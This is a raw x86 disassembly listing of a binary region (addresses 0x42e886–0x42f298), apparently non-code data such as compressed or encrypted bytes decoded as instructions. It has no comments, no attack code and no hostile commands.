  42e886:	sbb    edx,esp
  42e888:	in     eax,dx
  42e889:	adc    eax,0xfb25f41d
  42e88e:	into   
  42e88f:	jns    0x42e888
  42e891:	pop    ecx
  42e892:	lds    edx,FWORD PTR [ecx+0x28520441]
  42e898:	cmp    BYTE PTR [ebp-0x65],dh
  42e89b:	jecxz  0x42e85b
  42e89d:	jg     0x42e857
  42e89f:	mov    edx,0xc442cabb
  42e8a4:	jae    0x42e8d4
  42e8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e8a7:	mov    ch,0x99
  42e8a9:	xchg   esi,eax
  42e8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e8ab:	sbb    eax,0x38574d30
  42e8b0:	mov    ds:0x27e92a9c,al
  42e8b5:	push   0x1c
  42e8b7:	jbe    0x42e8ed
  42e8b9:	xchg   esi,eax
  42e8ba:	stc    
  42e8bb:	push   ebx
  42e8bc:	add    eax,0xdce88aff
  42e8c1:	jnp    0x42e93e
  42e8c3:	mov    al,ds:0x5841ddf2
  42e8c8:	iret   
  42e8c9:	or     BYTE PTR [eax+esi*1],al
  42e8cc:	sbb    al,0xd3
  42e8ce:	sar    DWORD PTR [ebx],1
  42e8d0:	mov    BYTE PTR [edi+0x46d87384],bh
  42e8d6:	push   0x29
  42e8d8:	iret   
  42e8d9:	fmul   DWORD PTR [eax]
  42e8db:	mov    al,0xd9
  42e8dd:	and    ah,BYTE PTR [edi+0x6ec38ed2]
  42e8e3:	or     dl,ch
  42e8e5:	dec    cx
  42e8e7:	mov    dl,0x5b
  42e8e9:	jnp    0x42e905
  42e8eb:	pop    ss
  42e8ec:	out    dx,eax
  42e8ed:	repnz add BYTE PTR [eax],al
	...
  42e954:	add    BYTE PTR [eax],al
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x73dc07d5]
  42e963:	mov    bl,0x4b
  42e965:	and    al,0x67
  42e967:	repz add DWORD PTR [eax],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	xchg   BYTE PTR [ecx],dh
  42e970:	aas    
  42e971:	xchg   ebp,eax
  42e972:	cmp    DWORD PTR [edi+0x5a],ebp
  42e975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e976:	jp     0x42e9ab
  42e978:	adc    eax,0xfb82d34a
  42e97d:	jle    0x42e99a
  42e97f:	pop    edi
  42e980:	test   DWORD PTR [ebx+0x7edcfad4],0xac9fa6df
  42e98a:	cmp    DWORD PTR [edi],esi
  42e98c:	pop    ds
  42e98d:	es mov al,0xd4
  42e990:	aad    0x89
  42e992:	dec    esi
  42e993:	jno    0x42e9ad
  42e995:	gs lock mov cl,0xf1
  42e999:	repnz add ch,bl
  42e99c:	ret    
  42e99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e99e:	xchg   ebx,eax
  42e99f:	ja     0x42e9fe
  42e9a1:	cs xchg edi,eax
  42e9a3:	adc    DWORD PTR [ebx],0x7d
  42e9a6:	adc    edx,DWORD PTR ds:0xc9819e9a
  42e9ac:	call   0xb1dba616
  42e9b1:	mov    bh,ah
  42e9b3:	jno    0x42e975
  42e9b5:	add    eax,0x2c10ae67
  42e9ba:	cmp    esi,DWORD PTR [eax+ebp*8-0x20]
  42e9be:	enter  0xbb85,0x87
  42e9c2:	cmp    dh,BYTE PTR [eax+0x2c]
  42e9c5:	push   es
  42e9c6:	mov    ch,0x7f
  42e9c8:	add    DWORD PTR [ecx-0x22],ecx
  42e9cb:	out    0x9e,al
  42e9cd:	or     DWORD PTR [edi],ecx
  42e9cf:	(bad)  
  42e9d0:	mov    ebp,0x1a565cdf
  42e9d5:	mov    ah,BYTE PTR [esi]
  42e9d7:	sub    eax,0x589abdca
  42e9dc:	clc    
  42e9dd:	idiv   BYTE PTR [ecx+0x683c5801]
  42e9e3:	test   BYTE PTR [ecx],bh
  42e9e5:	cdq    
  42e9e6:	mov    ecx,0xf25300b2
  42e9eb:	lea    esp,ds:0xea172827
  42e9f1:	nop
  42e9f2:	out    0xc7,eax
  42e9f4:	sbb    eax,0x28104ac6
  42e9f9:	leave  
  42e9fa:	push   eax
  42e9fb:	sub    BYTE PTR [ebx],0x71
  42e9fe:	shr    DWORD PTR [edi-0x52],1
  42ea01:	imul   ebx,DWORD PTR [ecx+0x4d],0xf7eeccab
  42ea08:	mov    dh,BYTE PTR [esi-0x2911c91d]
  42ea0e:	std    
  42ea0f:	jbe    0x42e9c6
  42ea11:	jo     0x42ea2d
  42ea13:	fwait
  42ea14:	pop    ecx
  42ea15:	or     eax,0xe7a214be
  42ea1a:	mov    al,0xb3
  42ea1c:	inc    edx
  42ea1d:	ss jp  0x42ea0c
  42ea20:	bound  edi,QWORD PTR [ebp+0x7c]
  42ea23:	pop    ss
  42ea24:	and    bh,BYTE PTR [eax]
  42ea26:	sbb    cl,BYTE PTR [edx+ecx*2+0xa]
  42ea2a:	add    BYTE PTR [ecx+0x3e],ah
  42ea2d:	les    esp,FWORD PTR [esi]
  42ea2f:	mov    eax,ds:0x24ef452
  42ea34:	mov    ebx,0xf5564ae4
  42ea39:	mov    eax,ds:0xa7c96764
  42ea3e:	jnp    0x42ea68
  42ea40:	outs   dx,BYTE PTR ds:[esi]
  42ea41:	or     DWORD PTR ss:[esi-0x47],edi
  42ea45:	gs pop ebx
  42ea47:	out    0xa5,al
  42ea49:	mov    eax,0x26772376
  42ea4e:	add    al,0xab
  42ea50:	xor    ecx,DWORD PTR [eax-0x2]
  42ea53:	pop    edx
  42ea54:	ja     0x42ea1e
  42ea56:	mov    gs,ebx
  42ea58:	jo     0x42ea7d
  42ea5a:	scas   eax,DWORD PTR es:[edi]
  42ea5b:	cs pushf 
  42ea5d:	not    BYTE PTR [eax-0x37]
  42ea60:	pop    es
  42ea61:	pop    esp
  42ea62:	xchg   esi,eax
  42ea63:	(bad)  
  42ea64:	and    eax,edi
  42ea66:	in     al,0x52
  42ea68:	xor    esi,ebp
  42ea6a:	push   ebx
  42ea6b:	inc    esp
  42ea6c:	xchg   BYTE PTR ds:0x0,dl
	...
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	int    0xdd
  42eae4:	(bad)  
  42eae5:	fldenv [edi-0xc]
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	sar    ebp,cl
  42eaf0:	(bad)  
  42eaf1:	ins    BYTE PTR es:[edi],dx
  42eaf2:	or     DWORD PTR [ebx],edx
  42eaf4:	push   esi
  42eaf5:	jmp    0xe6e5357
  42eafa:	call   0xb60c:0x9e4717bd
  42eb01:	sub    ch,dl
  42eb03:	adc    DWORD PTR [eax-0x63],edi
  42eb06:	test   al,0xbb
  42eb08:	out    0xcb,al
  42eb0a:	mov    edx,0x49885376
  42eb0f:	jns    0x42eaae
  42eb11:	test   ecx,edi
  42eb13:	inc    ecx
  42eb14:	cmp    cl,BYTE PTR [eax+ecx*8]
  42eb17:	fnstsw WORD PTR [eax]
  42eb19:	dec    esp
  42eb1a:	std    
  42eb1b:	xlat   BYTE PTR ds:[bx]
  42eb1d:	ss leave 
  42eb1f:	rcr    BYTE PTR [ebx-0x29],cl
  42eb22:	fdivr  st,st(2)
  42eb24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb26:	xchg   esi,eax
  42eb27:	push   0xffffff89
  42eb29:	outs   dx,DWORD PTR ds:[esi]
  42eb2a:	imul   esp,esp,0xc0786b46
  42eb30:	not    DWORD PTR [ebx+0x7d395289]
  42eb36:	popf   
  42eb37:	mov    edx,0xb55896fd
  42eb3c:	mov    eax,ds:0x21c74f4b
  42eb41:	push   cs
  42eb42:	add    DWORD PTR [eax],esi
  42eb44:	xchg   ebx,eax
  42eb45:	dec    edx
  42eb46:	ins    BYTE PTR es:[edi],dx
  42eb47:	fcomp  QWORD PTR [bp+si+0x467a]
  42eb4c:	mov    ebx,0x67731187
  42eb51:	sub    ah,BYTE PTR [edi-0x68762fa2]
  42eb57:	call   0xd5ce18c0
  42eb5c:	aas    
  42eb5d:	jns    0x42eb79
  42eb5f:	cli    
  42eb60:	lea    ebx,[esi]
  42eb62:	mov    bl,0x53
  42eb64:	(bad)  
  42eb65:	das    
  42eb66:	aas    
  42eb67:	xlat   BYTE PTR ds:[ebx]
  42eb68:	xor    esp,DWORD PTR [ecx]
  42eb6a:	adc    DWORD PTR [ebx+0x39c081ec],ecx
  42eb70:	data16 jle 0x42ebc6
  42eb73:	inc    ebp
  42eb74:	imul   eax,DWORD PTR [esi-0x4d],0x6e84f260
  42eb7b:	or     edx,edx
  42eb7d:	xor    BYTE PTR [eax],al
  42eb7f:	scas   eax,DWORD PTR es:[edi]
  42eb80:	xor    BYTE PTR [eax],al
  42eb82:	fdiv   DWORD PTR [eax]
  42eb84:	sbb    ebp,DWORD PTR [edx]
  42eb86:	out    dx,eax
  42eb87:	out    0x55,al
  42eb89:	mov    ecx,0xf276bc9b
  42eb8e:	xchg   BYTE PTR [ecx],bl
  42eb90:	pop    ds
  42eb91:	sbb    eax,0x8b051b3d
  42eb96:	ds pop ss
  42eb98:	stc    
  42eb99:	daa    
  42eb9a:	dec    edi
  42eb9b:	pop    ebx
  42eb9c:	ins    BYTE PTR es:[edi],dx
  42eb9d:	mov    bh,0xd8
  42eb9f:	pop    edx
  42eba0:	sub    BYTE PTR [eax],cl
  42eba2:	test   BYTE PTR [edx+eax*8+0x2336b7a7],bh
  42eba9:	jbe    0x42eb5b
  42ebab:	dec    ebx
  42ebac:	call   0x3b6a3783
  42ebb1:	push   ebx
  42ebb2:	and    edx,eax
  42ebb4:	sbb    al,0x60
  42ebb6:	shl    ebp,cl
  42ebb8:	and    DWORD PTR [edi],0x1d8ba309
  42ebbe:	xor    eax,DWORD PTR [eax]
  42ebc0:	jecxz  0x42ec3f
  42ebc2:	rcl    edx,cl
  42ebc4:	loopne 0x42ec25
  42ebc6:	jbe    0x42eb5f
  42ebc8:	fmul   DWORD PTR [ecx+0x25faa68e]
  42ebce:	adc    ebx,DWORD PTR [esi]
  42ebd0:	cmp    al,0xc3
  42ebd2:	test   eax,0x1dab8656
  42ebd7:	jnp    0x42eb5b
  42ebd9:	pop    es
  42ebda:	test   al,0xf6
  42ebdc:	retf   0xc09e
  42ebdf:	dec    eax
  42ebe0:	int    0x72
  42ebe2:	push   esp
  42ebe3:	pusha  
  42ebe4:	jno    0x42ec53
  42ebe6:	pop    esi
  42ebe7:	add    BYTE PTR [edi-0x1],dl
  42ebea:	lahf   
  42ebeb:	inc    ebx
  42ebec:	ret    0xe0
	...
  42ec53:	add    BYTE PTR [eax],al
  42ec55:	add    BYTE PTR [esi+0x41],bh
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sub    esi,0x67d9f6cc
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	ja     0x42ec56
  42ec70:	jne    0x42ecc6
  42ec72:	jle    0x42ec6c
  42ec74:	retf   
  42ec75:	fisub  WORD PTR [edi+edx*1]
  42ec78:	or     eax,0xcb9b893
  42ec7d:	inc    edi
  42ec7e:	jo     0x42ec5b
  42ec80:	sub    al,0x1c
  42ec82:	pop    esp
  42ec83:	out    0x62,eax
  42ec85:	es push 0x62
  42ec88:	push   ss
  42ec89:	inc    edi
  42ec8a:	div    edi
  42ec8c:	ins    DWORD PTR es:[edi],dx
  42ec8d:	mov    ?,edi
  42ec8f:	lea    esp,[ebp+eiz*4-0x2c]
  42ec93:	aam    0xae
  42ec95:	out    dx,eax
  42ec96:	in     eax,dx
  42ec97:	je     0x42ecad
  42ec99:	lea    edi,[edi-0xe]
  42ec9c:	nop
  42ec9d:	pop    esp
  42ec9e:	neg    BYTE PTR gs:[eax]
  42eca1:	dec    bl
  42eca3:	fldcw  WORD PTR [edi+0x5f]
  42eca6:	push   edx
  42eca7:	jg     0x42ecac
  42eca9:	js     0x42ed17
  42ecab:	mov    eax,ds:0x46b070c7
  42ecb0:	push   ebx
  42ecb1:	mov    eax,ds:0xb5a7b566
  42ecb6:	mov    BYTE PTR ds:0xcb4f56b1,bl
  42ecbc:	test   eax,0x5ba5413
  42ecc1:	pop    ebx
  42ecc2:	xor    dl,cl
  42ecc4:	aas    
  42ecc5:	aaa    
  42ecc6:	xor    DWORD PTR [edi+0x796c6f74],0x65
  42eccd:	xor    DWORD PTR [edx-0x2571f49a],0x92bb2ab9
  42ecd7:	repz xchg esp,eax
  42ecd9:	icebp  
  42ecda:	cli    
  42ecdb:	jae    0x42ec79
  42ecdd:	icebp  
  42ecde:	xchg   edx,eax
  42ecdf:	mov    WORD PTR [ebp+0x32d54b52],gs
  42ece5:	es cdq 
  42ece7:	jno    0x42ed5e
  42ece9:	cli    
  42ecea:	cmp    edx,DWORD PTR [eax+0x328ea3ac]
  42ecf0:	lods   al,BYTE PTR ds:[esi]
  42ecf1:	and    eax,0xb3d03dfb
  42ecf6:	repz lock aas 
  42ecf9:	pop    eax
  42ecfa:	loope  0x42ec97
  42ecfc:	mov    al,ds:0x44229d4a
  42ed01:	hlt    
  42ed02:	dec    ebp
  42ed03:	push   esi
  42ed04:	lea    ebp,[edi-0x21]
  42ed07:	mov    ax,0x1d5a
  42ed0b:	push   edx
  42ed0c:	call   eax
  42ed0e:	cmp    eax,0x1482e955
  42ed13:	nop
  42ed14:	xchg   esi,eax
  42ed15:	jno    0x42ecb9
  42ed17:	call   0x91ce:0xeda13e51
  42ed1e:	outs   dx,BYTE PTR ds:[esi]
  42ed1f:	sub    ebp,edi
  42ed21:	adc    al,0xd9
  42ed23:	call   0xffd:0xfca0f5c1
  42ed2a:	sub    dl,BYTE PTR ds:0x83bccf6a
  42ed30:	(bad)  
  42ed32:	dec    esi
  42ed33:	loope  0x42ed80
  42ed35:	pop    es
  42ed36:	mov    edx,0x5f57f885
  42ed3b:	mov    dl,0xa5
  42ed3d:	dec    ebp
  42ed3e:	arpl   dx,si
  42ed40:	int    0x18
  42ed42:	shl    DWORD PTR [ebx+eiz*8],1
  42ed45:	repz jl 0x42ed4f
  42ed48:	dec    ebx
  42ed49:	cmp    edx,DWORD PTR ds:0xdfb5962
  42ed4f:	div    BYTE PTR [edx-0x7714d040]
  42ed55:	imul   esp,eax,0xffffffe1
  42ed58:	xchg   BYTE PTR [esi-0x1592796],bl
  42ed5e:	pop    ecx
  42ed5f:	mov    cs,WORD PTR [eax-0x40f9b20a]
  42ed65:	sbb    BYTE PTR [ecx],0xa5
  42ed68:	pop    ebp
  42ed69:	add    BYTE PTR [eax+0x3c3230],al
	...
  42edd3:	add    BYTE PTR [eax],al
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp+0x7eb648a2]
  42ede5:	dec    ebx
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	hlt    
  42edef:	repz and DWORD PTR [edi+0x7e63bf3a],edx
  42edf6:	jecxz  0x42ed7b
  42edf8:	pop    eax
  42edf9:	stos   DWORD PTR es:[edi],eax
  42edfa:	int3   
  42edfb:	xchg   edx,eax
  42edfc:	out    dx,eax
  42edfd:	pop    es
  42edfe:	pusha  
  42edff:	into   
  42ee00:	dec    esi
  42ee01:	push   ss
  42ee02:	mov    ds:0xbd9304d8,eax
  42ee07:	and    bh,BYTE PTR ds:0xa360fc1e
  42ee0d:	cdq    
  42ee0e:	retf   
  42ee0f:	je     0x42ee87
  42ee11:	add    eax,0xa844af62
  42ee16:	mov    cl,0x54
  42ee18:	call   0x7d12:0xeb544e5e
  42ee1f:	call   0xfd0d41d5
  42ee24:	sub    DWORD PTR [eax+ebx*8],ebx
  42ee27:	lods   eax,DWORD PTR ds:[esi]
  42ee28:	ret    0xb150
  42ee2b:	test   al,0x9a
  42ee2d:	es int3 
  42ee2f:	loope  0x42ee11
  42ee31:	cdq    
  42ee32:	push   DWORD PTR [ebx]
  42ee34:	call   0x9962:0x7bb6809b
  42ee3b:	rcr    DWORD PTR [ecx+eiz*2+0x1e],1
  42ee3f:	stc    
  42ee40:	into   
  42ee41:	xchg   edx,eax
  42ee42:	jge    0x42ee66
  42ee44:	ficom  WORD PTR [ecx+0x7e]
  42ee47:	sbb    dh,BYTE PTR [ebx]
  42ee49:	and    eax,DWORD PTR [ebx-0x17]
  42ee4c:	pop    ecx
  42ee4d:	jnp    0x42edf8
  42ee4f:	dec    ebp
  42ee50:	mov    eax,0xeda21315
  42ee55:	pop    edi
  42ee56:	scas   al,BYTE PTR es:[edi]
  42ee57:	and    eax,0x2eaada77
  42ee5c:	jmp    0x42eded
  42ee5e:	cmp    edi,edx
  42ee60:	loope  0x42eed4
  42ee62:	shr    DWORD PTR [edi],1
  42ee64:	push   esp
  42ee65:	xchg   edi,eax
  42ee66:	xor    bl,ch
  42ee68:	pop    ecx
  42ee69:	jnp    0x42edf5
  42ee6b:	add    al,0x30
  42ee6d:	pop    es
  42ee6e:	or     cl,bl
  42ee70:	inc    ebp
  42ee71:	jbe    0x42ee2e
  42ee73:	add    cl,al
  42ee75:	pushf  
  42ee76:	aas    
  42ee77:	mov    ds:0x314b474b,eax
  42ee7c:	adc    eax,ebx
  42ee7e:	push   ss
  42ee7f:	sbb    BYTE PTR [ecx-0x77906266],dl
  42ee85:	aad    0x8
  42ee87:	jmp    0xe02e0d84
  42ee8c:	jae    0x42ee1d
  42ee8e:	mov    al,0xf6
  42ee90:	xor    DWORD PTR [esi-0x69d23bab],edi
  42ee96:	mov    bp,WORD PTR [ecx]
  42ee99:	bound  eax,QWORD PTR [eax]
  42ee9b:	mov    eax,DWORD PTR [ecx]
  42ee9d:	sbb    eax,0x7e5b644
  42eea2:	aaa    
  42eea3:	out    dx,al
  42eea4:	cmp    eax,0xa9534305
  42eea9:	push   ebp
  42eeaa:	adc    al,dh
  42eeac:	ja     0x42ee7f
  42eeae:	enter  0x6295,0xd5
  42eeb2:	mov    eax,0x9842ae6e
  42eeb7:	pop    eax
  42eeb8:	test   al,0x6b
  42eeba:	add    dh,BYTE PTR [ebx+0x30]
  42eebd:	push   esp
  42eebe:	(bad)  
  42eec0:	mov    WORD PTR gs:[ecx-0x103758e2],?
  42eec7:	push   ebp
  42eec8:	(bad)  
  42eec9:	and    DWORD PTR [eax],ecx
  42eecb:	enter  0xb439,0x91
  42eecf:	dec    esi
  42eed0:	fs js  0x42ef4c
  42eed3:	inc    eax
  42eed4:	pop    ecx
  42eed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eed6:	scas   eax,DWORD PTR es:[edi]
  42eed7:	icebp  
  42eed8:	fstp   TBYTE PTR [esi-0x5b6de75c]
  42eede:	mov    bh,BYTE PTR [eax-0x3b]
  42eee1:	aam    0x14
  42eee3:	into   
  42eee4:	dec    eax
  42eee5:	retf   
  42eee6:	inc    edi
  42eee7:	sub    BYTE PTR [edi-0x3cd78e4f],0x3a
	...
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	xchg   ebx,eax
  42ef63:	xor    dl,BYTE PTR [ebx+0x1f76759]
  42ef69:	add    BYTE PTR [eax],al
  42ef6b:	add    DWORD PTR [eax],eax
  42ef6d:	add    BYTE PTR [esi],bl
  42ef6f:	dec    ebp
  42ef70:	fnstenv [ebx-0x6361897e]
  42ef76:	xor    eax,0x57195fb8
  42ef7b:	jle    0x42ef79
  42ef7d:	dec    ecx
  42ef7e:	mov    BYTE PTR [edi+0x67],dh
  42ef81:	daa    
  42ef82:	popa   
  42ef83:	cmp    DWORD PTR [edx],ebx
  42ef85:	and    ebp,DWORD PTR [edi-0x1ee0eed1]
  42ef8b:	adc    eax,0x2e99be12
  42ef90:	enter  0xe842,0x82
  42ef94:	push   0x4
  42ef96:	cmp    bh,BYTE PTR [ebx]
  42ef98:	pop    ds
  42ef99:	jmp    0x42efed
  42ef9b:	loope  0x42ef6f
  42ef9d:	xchg   dl,dl
  42ef9f:	xchg   ecx,eax
  42efa0:	push   ebp
  42efa1:	sbb    ah,BYTE PTR [edi]
  42efa3:	mul    DWORD PTR [esp+ebx*1-0x4f8dd0ba]
  42efaa:	stc    
  42efab:	dec    ecx
  42efac:	aad    0x54
  42efae:	xchg   esp,eax
  42efaf:	push   esi
  42efb0:	mov    dl,al
  42efb2:	js     0x42f00d
  42efb4:	pusha  
  42efb5:	pop    ds
  42efb6:	cld    
  42efb7:	inc    edx
  42efb8:	stos   BYTE PTR es:[edi],al
  42efb9:	sub    bl,0x82
  42efbc:	rcr    BYTE PTR [eax-0x5f],cl
  42efbf:	bound  esp,QWORD PTR ds:0x9709c051
  42efc5:	and    dl,BYTE PTR [eax+0x28235612]
  42efcb:	and    eax,0x4381de30
  42efd0:	cdq    
  42efd1:	in     al,dx
  42efd2:	push   edx
  42efd3:	sbb    DWORD PTR [ebp+0x24fa778c],ebx
  42efd9:	neg    dh
  42efdb:	iret   
  42efdc:	pop    esi
  42efdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efde:	aad    0xc9
  42efe0:	nop
  42efe1:	jmp    0xc56fdd6b
  42efe6:	div    DWORD PTR [eax+0x60]
  42efe9:	pop    esp
  42efea:	push   ebx
  42efeb:	out    dx,eax
  42efec:	ret    0xf944
  42efef:	push   ebx
  42eff0:	shl    bl,cl
  42eff2:	test   al,0xd4
  42eff5:	xacquire xchg BYTE PTR [edx+0x33],dh
  42eff9:	adc    al,BYTE PTR [edi+0x6cfde41f]
  42efff:	fisttp DWORD PTR [ecx+0x75]
  42f002:	es hlt 
  42f004:	call   0xb746:0x97ec380c
  42f00b:	mov    bh,0x35
  42f00d:	test   dl,dl
  42f00f:	push   0x16
  42f011:	inc    eax
  42f012:	jmp    0x42ef96
  42f014:	ins    BYTE PTR es:[edi],dx
  42f015:	mov    DWORD PTR [ebx+0x71],0x7aa543c9
  42f01c:	and    al,0x5b
  42f01e:	or     eax,edx
  42f020:	and    al,0x23
  42f022:	(bad)  
  42f023:	sbb    BYTE PTR [edx],dl
  42f025:	xor    al,0x6
  42f027:	dec    ebx
  42f028:	adc    BYTE PTR [esi+ebx*4+0x7937031],al
  42f02f:	or     BYTE PTR ds:0x420130d8,dh
  42f035:	aam    0xaf
  42f037:	sbb    dl,dh
  42f039:	lods   eax,DWORD PTR ds:[esi]
  42f03a:	jnp    0x42f02e
  42f03c:	imul   ebx,DWORD PTR [eax-0x810584b],0xea1ba3cd
  42f046:	or     DWORD PTR es:[eax+0x75],ecx
  42f04a:	ins    DWORD PTR es:[edi],dx
  42f04b:	arpl   WORD PTR [edx+ebp*4-0x5a],si
  42f04f:	add    DWORD PTR [edi-0x64],0xffffffe9
  42f053:	lock adc BYTE PTR [esp+ecx*4],bh
  42f057:	push   edx
  42f058:	xor    DWORD PTR [ecx-0x7b],edx
  42f05b:	cmp    DWORD PTR [ecx+0x55e6a4b3],0x68
  42f062:	jne    0x42f0bb
  42f064:	and    DWORD PTR ds:0x7611eb52,esp
  42f06a:	mov    dh,0xd8
  42f06c:	(bad)  
  42f06d:	inc    esp
	...
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	ins    BYTE PTR es:[edi],dx
  42f0e3:	mov    edi,0xf8675376
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	xor    bl,ah
  42f0f0:	ss pop eax
  42f0f2:	imul   esp,esi,0xc3ef987c
  42f0f8:	shr    BYTE PTR [ecx-0xa2f5d9a],0x4e
  42f0ff:	gs push es
  42f101:	xor    edi,DWORD PTR [esi+0x5]
  42f104:	mov    esi,0x76054f04
  42f109:	jbe    0x42f17a
  42f10b:	sbb    al,BYTE PTR [ebx]
  42f10d:	test   al,0xde
  42f10f:	aad    0x60
  42f111:	test   BYTE PTR [ecx],ch
  42f113:	mov    ch,0x68
  42f115:	pcmpgtb mm1,QWORD PTR ds:0x658322e1
  42f11c:	cld    
  42f11d:	push   ebx
  42f11e:	ficomp DWORD PTR [edi-0x63e00783]
  42f124:	inc    esp
  42f125:	pop    edi
  42f126:	jne    0x42f18a
  42f128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f129:	(bad)  
  42f12a:	jmp    0x42f0f7
  42f12c:	test   DWORD PTR [eax+0x0],edi
  42f12f:	add    ebx,DWORD PTR [edx-0x7d]
  42f132:	xlat   BYTE PTR ds:[ebx]
  42f133:	inc    eax
  42f134:	call   0x1519cc92
  42f139:	dec    ebp
  42f13a:	in     eax,dx
  42f13b:	inc    edx
  42f13c:	jp     0x42f184
  42f13e:	xchg   bp,ax
  42f140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f141:	lods   eax,DWORD PTR ds:[esi]
  42f142:	fistp  DWORD PTR [eax+0x3f]
  42f145:	xchg   ecx,eax
  42f146:	gs dec esi
  42f148:	jo     0x42f0d8
  42f14a:	xchg   DWORD PTR [edx],edi
  42f14c:	cld    
  42f14d:	push   edx
  42f14e:	ficomp DWORD PTR [eax+0x7b7b724b]
  42f154:	ret    0xcef7
  42f157:	cwde   
  42f158:	(bad)  
  42f159:	les    edx,FWORD PTR [eax+0x62]
  42f15c:	jns    0x42f0f6
  42f15e:	sub    edx,esp
  42f160:	loop   0x42f1c9
  42f162:	sub    ecx,0x783cad02
  42f168:	inc    ebp
  42f169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f16a:	je     0x42f111
  42f16c:	stos   DWORD PTR es:[edi],eax
  42f16d:	out    0xc3,al
  42f16f:	xor    BYTE PTR [ebp-0x612106f9],bh
  42f175:	xchg   BYTE PTR [esi],bh
  42f177:	jbe    0x42f13f
  42f179:	pop    ebp
  42f17a:	sbb    dl,dh
  42f17c:	jae    0x42f10a
  42f17e:	mov    BYTE PTR [ecx+0x7ca71aeb],al
  42f184:	ret    
  42f185:	jecxz  0x42f149
  42f187:	jl     0x42f19b
  42f189:	xchg   ebp,eax
  42f18a:	pop    ss
  42f18b:	sub    DWORD PTR [ebx],0x3c52c24b
  42f191:	jp     0x42f1a5
  42f193:	idiv   DWORD PTR [edx-0x3adfe281]
  42f199:	mov    ecx,0xc22dad77
  42f19e:	dec    esi
  42f19f:	pop    ss
  42f1a0:	sub    DWORD PTR [ebp-0x65e1ef9a],ecx
  42f1a6:	stos   DWORD PTR es:[edi],eax
  42f1a7:	inc    esi
  42f1a8:	add    DWORD PTR [ebp-0x5e0812c7],eax
  42f1ae:	and    BYTE PTR [esi],bh
  42f1b0:	sub    BYTE PTR [edx],ah
  42f1b2:	addr16 (bad) 
  42f1b4:	out    dx,al
  42f1b5:	sbb    DWORD PTR [ecx],edx
  42f1b7:	sbb    DWORD PTR [ebx],0xffffff8c
  42f1ba:	(bad)  
  42f1bb:	push   ds
  42f1bc:	and    edx,esi
  42f1be:	jno    0x42f176
  42f1c0:	dec    esp
  42f1c1:	pop    ebx
  42f1c2:	scas   eax,DWORD PTR es:[edi]
  42f1c3:	dec    edx
  42f1c4:	cmp    BYTE PTR [eax+edi*4],ch
  42f1c7:	fisub  DWORD PTR [ecx-0x54]
  42f1ca:	aas    
  42f1cb:	dec    ebp
  42f1cc:	xchg   cl,cl
  42f1ce:	xor    cl,BYTE PTR ss:[edi-0x68a42eef]
  42f1d5:	in     eax,0x82
  42f1d7:	dec    esi
  42f1d8:	push   edx
  42f1d9:	idiv   BYTE PTR [ecx-0x487cf95c]
  42f1df:	inc    esp
  42f1e0:	iret   
  42f1e1:	jb     0x42f200
  42f1e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1e4:	loop   0x42f214
  42f1e6:	dec    esi
  42f1e7:	jmp    0x42f18b
  42f1e9:	pop    eax
  42f1ea:	ret    0x1115
  42f1ed:	into   
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	sbb    DWORD PTR [ecx-0x698ac82],esi
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	iret   
  42f26f:	jmp    0x6906:0x83abf612
  42f276:	frstor [edx+0x3790ea0c]
  42f27c:	shl    DWORD PTR ds:0xef46b391,cl
  42f282:	xchg   ecx,eax
  42f283:	push   edi
  42f284:	mov    bl,0xe2
  42f286:	loopne 0x42f266
  42f288:	leave  
  42f289:	cmp    al,0x21
  42f28b:	or     ecx,0x2a1cd74f
  42f291:	xchg   edx,eax
  42f292:	mov    al,ds:0xe77d2237
  42f297:	outs   dx,DWORD PTR ds:[esi]
  42f298:	push   edi
